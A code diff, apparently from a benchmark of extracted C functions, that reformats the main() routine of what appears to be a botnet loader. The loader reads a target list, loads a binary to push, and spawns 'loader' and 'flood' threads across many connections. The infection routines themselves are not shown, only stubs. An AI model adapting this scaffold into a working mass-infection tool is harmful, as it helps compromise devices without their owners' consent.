@@ -1,64 +1,64 @@
-#define NULL ((void*)0)
-typedef unsigned long size_t;  // Customize by platform.
+
+typedef unsigned long size_t;
 typedef long intptr_t; typedef unsigned long uintptr_t;
-typedef long scalar_t__;  // Either arithmetic or pointer type.
-/* By default, we understand bool (as a convenience). */
+typedef long scalar_t__;
+
 typedef int bool;
-#define false 0
-#define true 1
 
-/* Forward declarations */
-typedef  struct TYPE_2__   TYPE_1__ ;
 
-/* Type definitions */
-typedef  int /*<<< orphan*/  time_t ;
-typedef  int /*<<< orphan*/  timeText ;
+
+
+typedef struct TYPE_2__ TYPE_1__ ;
+
+
+typedef int time_t ;
+typedef int timeText ;
 struct tm {int dummy; } ;
-typedef  int /*<<< orphan*/  pthread_t ;
-struct TYPE_2__ {int /*<<< orphan*/  mutex; } ;
+typedef int pthread_t ;
+struct TYPE_2__ {int mutex; } ;
 
-/* Variables and functions */
- int /*<<< orphan*/  SIGINT ; 
- int /*<<< orphan*/  SIGPIPE ; 
- int /*<<< orphan*/ * SIG_IGN ; 
- void* atoi (char*) ; 
- char* bind_ip ; 
- int bytes_sent ; 
- int debug_mode ; 
- int /*<<< orphan*/  epollFD ; 
- int /*<<< orphan*/  epoll_create (int) ; 
- int /*<<< orphan*/  exit (int) ; 
- scalar_t__ failed_connect ; 
- int /*<<< orphan*/  fflush (int /*<<< orphan*/ ) ; 
- int /*<<< orphan*/  flood ; 
- int /*<<< orphan*/  fopen (char*,char*) ; 
- scalar_t__ found_srvs ; 
- int /*<<< orphan*/  fprintf (int /*<<< orphan*/ ,char*,...) ; 
- scalar_t__ getConnectedSockets () ; 
- int /*<<< orphan*/  infd ; 
- int /*<<< orphan*/  load_binary (char*) ; 
- int /*<<< orphan*/  loader ; 
- struct tm* localtime (int /*<<< orphan*/ *) ; 
- scalar_t__ login_done ; 
- scalar_t__ malloc (int) ; 
- void* maxConnectedSockets ; 
- int /*<<< orphan*/  memset (char*,char,int) ; 
- int /*<<< orphan*/  printf (char*,...) ; 
- int /*<<< orphan*/  pthread_create (int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *,void*) ; 
- int /*<<< orphan*/  pthread_mutex_init (int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
- scalar_t__ remote_hangup ; 
- char* run_arg ; 
- scalar_t__ running_threads ; 
- int /*<<< orphan*/  sighandler ; 
- int /*<<< orphan*/  signal (int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
- int /*<<< orphan*/  sleep (int) ; 
- int /*<<< orphan*/  sprintf (char*,char*,...) ; 
- TYPE_1__* stateTable ; 
- int /*<<< orphan*/  stderr ; 
- int /*<<< orphan*/  stdout ; 
- int /*<<< orphan*/  strftime (char*,int,char*,struct tm*) ; 
- int /*<<< orphan*/  time (int /*<<< orphan*/ *) ; 
- scalar_t__ timed_out ; 
+
+ int SIGINT ;
+ int SIGPIPE ;
+ int * SIG_IGN ;
+ void* atoi (char*) ;
+ char* bind_ip ;
+ int bytes_sent ;
+ int debug_mode ;
+ int epollFD ;
+ int epoll_create (int) ;
+ int exit (int) ;
+ scalar_t__ failed_connect ;
+ int fflush (int ) ;
+ int flood ;
+ int fopen (char*,char*) ;
+ scalar_t__ found_srvs ;
+ int fprintf (int ,char*,...) ;
+ scalar_t__ getConnectedSockets () ;
+ int infd ;
+ int load_binary (char*) ;
+ int loader ;
+ struct tm* localtime (int *) ;
+ scalar_t__ login_done ;
+ scalar_t__ malloc (int) ;
+ void* maxConnectedSockets ;
+ int memset (char*,char,int) ;
+ int printf (char*,...) ;
+ int pthread_create (int *,int *,int *,void*) ;
+ int pthread_mutex_init (int *,int *) ;
+ scalar_t__ remote_hangup ;
+ char* run_arg ;
+ scalar_t__ running_threads ;
+ int sighandler ;
+ int signal (int ,int *) ;
+ int sleep (int) ;
+ int sprintf (char*,char*,...) ;
+ TYPE_1__* stateTable ;
+ int stderr ;
+ int stdout ;
+ int strftime (char*,int,char*,struct tm*) ;
+ int time (int *) ;
+ scalar_t__ timed_out ;
 
 int main(int argc, char *argv[ ])
 {
@@ -67,35 +67,35 @@ int main(int argc, char *argv[ ])
         fprintf(stdout, "Usage: %s <bind ip> <input file> <file_to_load> <argument> <threads> <connections> (debug mode)\n", argv[0]);
         exit(-1);
     }
-    
+
     signal(SIGPIPE, SIG_IGN);
-    
+
     epollFD = epoll_create(0xDEAD);
     bind_ip = argv[1];
     infd = fopen(argv[2], "r");
     signal(SIGINT, &sighandler);
     int threads = atoi(argv[5]);
     maxConnectedSockets = atoi(argv[6]);
-    
+
     if (argc == 8)
         debug_mode = 1;
-    
+
     int i;
     for(i = 0; i < (1024 * 100); i++)
     {
-        pthread_mutex_init(&stateTable[i].mutex, NULL);
+        pthread_mutex_init(&stateTable[i].mutex, ((void*)0));
     }
 
     load_binary(argv[3]);
     run_arg = argv[4];
 
     pthread_t thread;
-    pthread_create( &thread, NULL, &loader, (void *) &threads);
+    pthread_create( &thread, ((void*)0), &loader, (void *) &threads);
 
-    for(i = 0; i < threads; i++) pthread_create( &thread, NULL, &flood, (void *) NULL);
+    for(i = 0; i < threads; i++) pthread_create( &thread, ((void*)0), &flood, (void *) ((void*)0));
 
     char timeText[100];
-    time_t now = time(NULL);
+    time_t now = time(((void*)0));
     struct tm *t = localtime(&now);
     strftime(timeText, sizeof(timeText)-1, "%d %b %Y %l:%M %p %Z", t);
 
@@ -150,7 +150,7 @@ int main(int argc, char *argv[ ])
     }
     printf("\n");
 
-    now = time(NULL);
+    now = time(((void*)0));
     t = localtime(&now);
     strftime(timeText, sizeof(timeText)-1, "%d %b %Y %l:%M %p %Z", t);
     printf("Scan finished at %s\n", timeText);
